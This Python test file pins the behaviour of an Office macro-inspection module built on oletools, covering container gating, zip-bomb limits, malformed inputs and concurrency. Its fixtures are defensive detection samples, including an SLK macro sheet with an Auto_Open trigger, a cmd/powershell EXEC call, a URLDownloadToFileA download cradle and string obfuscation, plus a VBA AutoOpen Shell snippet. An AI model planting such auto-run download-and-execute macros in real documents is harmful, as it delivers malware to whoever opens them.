"""Pins app/utils/office_inspect.py - Office container, encryption and VBA signals.

Every fixture is built here in-process; nothing is committed and nothing is downloaded.

The container gate is the important case. olevba falls back to ``parser.type == 'Text'``
and treats the whole file as VBA source, so ``detect_vba_macros()`` returns True for a
binary blob renamed ``.docm``. That is the same failure class as the
``to_dict()['status']`` incident in ``tasks/lessons.md``: a value whose name does not
describe its meaning. Every signal gates on ``parser.type`` first.

Two behaviours of oletools 0.60.2 were measured while writing these tests and shape the
fixtures:

* The Text fallback only engages when the file contains **no NUL byte** (olevba refuses
  to scan binary as source). A renamed PNG therefore raises ``FileOpenError`` rather than
  reaching the fallback, and a NUL-free binary blob is what actually exercises the gate.
  Both are fixtures here, because both must render as "not an Office document".
* ``analyze_macros()`` returns ``None``, not ``[]``, when there is no VBA code.
"""
import os
import sys
import tempfile
import zipfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from app.utils import office_inspect

failures = []
cases = 0


def check(condition, message):
    global cases
    cases += 1
    if not condition:
        failures.append(message)
    return bool(condition)


def write(box, name, blob):
    path = os.path.join(box, name)
    with open(path, 'wb') as handle:
        handle.write(blob)
    return path


def make_docx(box, name='clean.docx', extra=None, deflate_extra=False):
    """A minimal OOXML package. `extra` adds one more zip entry."""
    path = os.path.join(box, name)
    with zipfile.ZipFile(path, 'w') as archive:
        archive.writestr('[Content_Types].xml',
                         '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org'
                         '/package/2006/content-types"/>')
        archive.writestr('word/document.xml', '<?xml version="1.0"?><document/>')
        if extra:
            archive.writestr(
                *extra,
                compress_type=zipfile.ZIP_DEFLATED if deflate_extra else zipfile.ZIP_STORED)
    return path


# A macro sheet with an auto-open trigger, a shell execution, a download cradle and a
# string-obfuscation call. SLK is the one macro-bearing container that can be built from
# bytes alone: every other olevba macro path needs a real OLE compound file, which no
# stdlib module can write.
MACRO_SLK = (
    b'ID;PSAMPLE\r\n'
    b'O;E\r\n'
    b'NN;NAuto_Open;ER1C1\r\n'
    b'C;X1;Y1;EEXEC("cmd.exe /c powershell -enc")\r\n'
    b'C;X1;Y2;ECALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://example.com/a.exe",'
    b'"c:\\a.exe",0,0)\r\n'
    b'C;X1;Y3;EStrReverse("exe.dmc") & Chr(65)\r\n'
    b'E\r\n'
)


def test_a_renamed_png_is_not_an_office_document():
    """A PNG carries NUL bytes, so olevba refuses it outright with FileOpenError instead
    of reaching the Text fallback. The record must still say "this is not an Office
    document" rather than "analysis failed": the two render differently and only one of
    them is true."""
    png = (b'\x89PNG\r\n\x1a\n' + b'\x00\x00\x00\rIHDR' + b'\x00' * 32) * 8
    with tempfile.TemporaryDirectory() as box:
        result = office_inspect.analyze_office(write(box, 'notoffice.docm', png))
        keys = {s['key'] for s in result['signals']}
        check(result['has_macro'] is False,
              f'a renamed PNG reported a macro: container={result["container"]!r}')
        check('office_has_macro' not in keys,
              'a renamed PNG emitted the macro signal')
        check('office_not_office_container' in keys,
              f'a non-Office container was not reported as such: {result["signals"]}')


def test_the_text_fallback_cannot_promote_a_blob_into_a_macro():
    """THE case. With no NUL byte in it, a binary blob renamed .docm reaches olevba's
    Text fallback: parser.type == 'Text', detect_vba_macros() == True, and
    extract_all_macros() yields one 'macro' whose source is the entire file. Gating on
    parser.type before anything else is the only thing that stops that becoming a
    finding."""
    blob = b'\x89PNG\r\n\x1a\n' + b'\xff' * 300
    with tempfile.TemporaryDirectory() as box:
        result = office_inspect.analyze_office(write(box, 'nonul.docm', blob))
        keys = {s['key'] for s in result['signals']}
        check(result['container'] == 'Text',
              f'fixture is wrong: expected the Text fallback, got {result["container"]!r}')
        check(result['has_macro'] is False,
              'the Text fallback promoted a binary blob into a macro')
        check(result['modules'] == [],
              f'the Text fallback leaked a module: {result["modules"]}')
        check(keys == {'office_not_office_container'},
              f'a Text-typed blob emitted more than the container signal: {keys}')


def test_vba_source_named_as_a_document_is_still_gated_out():
    """A file of plain VBA source with an AutoOpen and a Shell call is genuinely
    suspicious text, but it is not an Office document, and the gate must suppress the
    macro signals rather than let olevba's Text fallback speak for a container that does
    not exist."""
    source = b'Sub AutoOpen()\r\nShell "cmd.exe /c calc"\r\nEnd Sub\r\n'
    with tempfile.TemporaryDirectory() as box:
        result = office_inspect.analyze_office(write(box, 'source.docm', source))
        keys = {s['key'] for s in result['signals']}
        check(result['container'] == 'Text',
              f'expected the Text fallback, got {result["container"]!r}')
        check('office_autoexec_macro' not in keys and 'office_shell_execution' not in keys,
              f'signals escaped the container gate: {keys}')


def test_a_macro_free_docx_reports_no_macro():
    with tempfile.TemporaryDirectory() as box:
        result = office_inspect.analyze_office(make_docx(box))
        check(result['error'] is None, f'a clean .docx errored: {result["error"]}')
        check(result['has_macro'] is False, 'a macro-free .docx reported a macro')
        check(result['container'] == 'OpenXML',
              f'expected OpenXML container, got {result["container"]!r}')
        check(result['signals'] == [],
              f'a clean .docx emitted signals: {result["signals"]}')


def test_analyze_macros_returns_none_not_an_empty_list():
    """Pins the library fact the `or []` in analyze_office guards. Iterating the return
    value directly raises TypeError in production, and a clean .docx is the cheapest
    file that reproduces it."""
    from oletools.olevba import VBA_Parser

    with tempfile.TemporaryDirectory() as box:
        parser = VBA_Parser(make_docx(box), relaxed=True, disable_pcode=True)
        try:
            rows = parser.analyze_macros(show_decoded_strings=False, deobfuscate=False)
        finally:
            parser.close()
    check(rows is None,
          f'analyze_macros() returned {rows!r}; the `or []` guard may no longer be needed')


def test_a_zip_bomb_is_rejected_before_parsing():
    """A 93 KB .docm carrying a valid OLE object padded with zeros drove a 304 MB peak
    and raised nothing. The 4 MB input cap does not bound this, because the cap applies
    to the COMPRESSED upload."""
    with tempfile.TemporaryDirectory() as box:
        path = make_docx(box, 'bomb.docm',
                         extra=('word/vbaProject.bin', b'\x00' * (80 * 1024 * 1024)),
                         deflate_extra=True)
        check(os.path.getsize(path) < office_inspect.MAX_BYTES,
              'fixture is wrong: the bomb must be under the input cap, or the cap and '
              'not the decompression budget is what rejects it')
        result = office_inspect.analyze_office(path)
        keys = {s['key'] for s in result['signals']}
        check('analysis_skipped_too_large' in keys,
              f'a zip bomb was not rejected before parsing: {result["signals"]}')
        check(result['has_macro'] is False, 'a zip bomb reported a macro')
        check(result['container'] is None,
              'a zip bomb was parsed far enough to report a container')


def test_malformed_files_never_raise():
    """Malformed OLE escapes as a bare builtins.AttributeError from olefile, so
    `except OlevbaBaseException` is not sufficient."""
    blobs = {
        'truncated.docm': b'PK\x03\x04' + b'\x00' * 500,
        'magic_only.doc': b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1' + b'\x00' * 500,
        'empty.docm': b'',
        'text.docm': b'Sub AutoOpen()\nMsgBox "hi"\nEnd Sub\n',
    }
    with tempfile.TemporaryDirectory() as box:
        for name, blob in blobs.items():
            try:
                result = office_inspect.analyze_office(write(box, name, blob))
            except Exception as exc:  # noqa: BLE001 - that is the point
                failures.append(f'{name} raised {type(exc).__name__}: {exc}')
                continue
            check(isinstance(result, dict), f'{name} did not return a record')
            check(result['has_macro'] is False or result['container'] in office_inspect.OFFICE_TYPES,
                  f'{name} claimed a macro from a non-Office container')
            check(result['signals'] != [],
                  f'{name} produced an empty record with no explanation of what happened')


def test_oversized_and_empty_files():
    """Review Focus 5: boundaries are where off-by-ones live."""
    with tempfile.TemporaryDirectory() as box:
        over = write(box, 'over.docm', b'PK\x03\x04' + b'\x00' * office_inspect.MAX_BYTES)
        keys = {s['key'] for s in office_inspect.analyze_office(over)['signals']}
        check('analysis_skipped_too_large' in keys,
              'a file over the cap was not reported as skipped')

        at_cap = write(box, 'at_cap.docm', b'\x00' * office_inspect.MAX_BYTES)
        keys = {s['key'] for s in office_inspect.analyze_office(at_cap)['signals']}
        check('analysis_skipped_too_large' not in keys,
              'a file exactly at the cap was skipped; the comparison is off by one')

        empty = write(box, 'empty2.docm', b'')
        result = office_inspect.analyze_office(empty)
        check(result['error'] is not None or result['has_macro'] is False,
              'a zero-byte file produced a macro claim')

        missing = os.path.join(box, 'does_not_exist.docm')
        result = office_inspect.analyze_office(missing)
        check(result['error'] is not None,
              'an unreadable path did not report an error')
        check({s['key'] for s in result['signals']} == {'analysis_error'},
              f'an unreadable path emitted the wrong signals: {result["signals"]}')


def test_pcodedmp_is_never_imported():
    """oletools is BSD; pcodedmp is GPLv3 and is a hard dependency whose import the
    default analyze_macros() path triggers. disable_pcode=True must keep it out."""
    with tempfile.TemporaryDirectory() as box:
        office_inspect.analyze_office(make_docx(box, 'probe.docm'))
    check('pcodedmp' not in sys.modules,
          'pcodedmp (GPLv3) was imported; disable_pcode=True is not being passed')


def test_disable_pcode_is_passed_to_every_parser():
    """The sys.modules check above only fails once the import actually happens, which
    needs a file that reaches VBA stomping detection. This pins the flag itself, on
    every construction, so the licence boundary does not depend on the fixture."""
    import oletools.olevba as olevba

    seen = []
    real = olevba.VBA_Parser

    class Recording(real):
        def __init__(self, *args, **kwargs):
            seen.append(kwargs)
            super().__init__(*args, **kwargs)

    olevba.VBA_Parser = Recording
    try:
        with tempfile.TemporaryDirectory() as box:
            office_inspect.analyze_office(make_docx(box, 'flagged.docm'))
    finally:
        olevba.VBA_Parser = real

    check(len(seen) == 1, f'expected one VBA_Parser construction, saw {len(seen)}')
    check(all(kwargs.get('disable_pcode') is True for kwargs in seen),
          f'VBA_Parser was constructed without disable_pcode=True: {seen}')


def test_signal_derivation_matches_live_olevba_output():
    """The signal derivation matches on olevba's own description strings, so it is only
    correct against the pinned version's keyword tables. This drives it with rows
    produced by oletools right now rather than with strings copied into the test, which
    is what makes a version bump fail here instead of silently changing verdicts.

    The fixture is an SLK macro sheet: it is a real Office container carrying a real
    auto-open trigger, shell execution, download cradle and string obfuscation.
    """
    from oletools.olevba import VBA_Parser

    with tempfile.TemporaryDirectory() as box:
        path = write(box, 'macro.slk', MACRO_SLK)
        parser = VBA_Parser(path, relaxed=True, disable_pcode=True)
        try:
            check(parser.type == 'SLK',
                  f'fixture is wrong: expected an SLK container, got {parser.type!r}')
            rows = parser.analyze_macros(show_decoded_strings=False, deobfuscate=False) or []
        finally:
            parser.close()

    check(rows != [], 'the fixture produced no analysis rows at all')

    signals = {s['key']: s for s in office_inspect._signals_from_results(rows)}
    check('office_autoexec_macro' in signals,
          f'a real AutoExec row did not produce the auto-exec signal: {rows}')
    check(signals.get('office_autoexec_macro', {}).get('detail') == 'Auto_Open',
          f'the auto-exec trigger name was lost: {signals.get("office_autoexec_macro")}')
    check('office_shell_execution' in signals,
          f'a real shell-execution row did not produce the shell signal: {rows}')
    check('office_download_cradle' in signals,
          f'a real download row did not produce the cradle signal: {rows}')
    check('office_obfuscated_vba' in signals,
          f'a real obfuscation row did not produce the obfuscation signal: {rows}')
    check(all(s['label'] != s['key'] for s in signals.values()),
          f'a signal fell back to its bare key for a label: {signals}')


def test_obfuscation_is_also_matched_by_item_name():
    """Hex, Base64 and VBA-expression strings arrive as an item name with a description
    that does not start 'May attempt to obfuscate', so the item set is a second, separate
    branch. These rows are olevba's literal output shape."""
    for item in sorted(office_inspect._OBFUSCATION_ITEMS):
        rows = [('Suspicious', item,
                 'Hex-encoded strings were detected, may be used to obfuscate strings')]
        keys = {s['key'] for s in office_inspect._signals_from_results(rows)}
        check('office_obfuscated_vba' in keys,
              f'the obfuscation item {item!r} did not produce a signal')

    check(office_inspect._signals_from_results([]) == [],
          'an empty analysis produced signals')


def test_a_saturated_analyser_reports_busy():
    """One Office file was measured at 304 MB peak, so N concurrent uploads must not be
    allowed N budgets. Saturating the semaphore here stands in for N-1 requests already
    in flight: the Nth must say it did not look, not block a gunicorn thread behind
    them."""
    held = 0
    try:
        for _ in range(office_inspect.MAX_CONCURRENT):
            check(office_inspect._slots.acquire(blocking=False),
                  'a slot was already held before the test started')
            held += 1

        with tempfile.TemporaryDirectory() as box:
            result = office_inspect.analyze_office(make_docx(box, 'busy.docm'))
        keys = {s['key'] for s in result['signals']}
        check(keys == {'analysis_busy'},
              f'a saturated analyser did not report busy: {result["signals"]}')
        check(result['container'] is None and result['has_macro'] is False,
              'a skipped analysis reported container or macro state it never observed')
        check(result['error'] is None,
              'being busy was reported as an error; it is a capacity fact, not a failure')
    finally:
        for _ in range(held):
            office_inspect._slots.release()

    # A released slot must be reusable, or one saturated request poisons the process.
    with tempfile.TemporaryDirectory() as box:
        result = office_inspect.analyze_office(make_docx(box, 'after.docm'))
    check(result['container'] == 'OpenXML',
          f'the analyser did not recover after saturation: {result["signals"]}')


SCENARIOS = (
    test_a_renamed_png_is_not_an_office_document,
    test_the_text_fallback_cannot_promote_a_blob_into_a_macro,
    test_vba_source_named_as_a_document_is_still_gated_out,
    test_a_macro_free_docx_reports_no_macro,
    test_analyze_macros_returns_none_not_an_empty_list,
    test_a_zip_bomb_is_rejected_before_parsing,
    test_malformed_files_never_raise,
    test_oversized_and_empty_files,
    test_disable_pcode_is_passed_to_every_parser,
    test_signal_derivation_matches_live_olevba_output,
    test_obfuscation_is_also_matched_by_item_name,
    test_a_saturated_analyser_reports_busy,
    # Last: it asserts on sys.modules after every other fixture has been parsed.
    test_pcodedmp_is_never_imported,
)


def main():
    for scenario in SCENARIOS:
        scenario()

    if failures:
        print('FAIL:')
        for line in failures:
            print('  ' + line)
        sys.exit(1)
    print(f'PASS: {cases} cases')


if __name__ == '__main__':
    main()
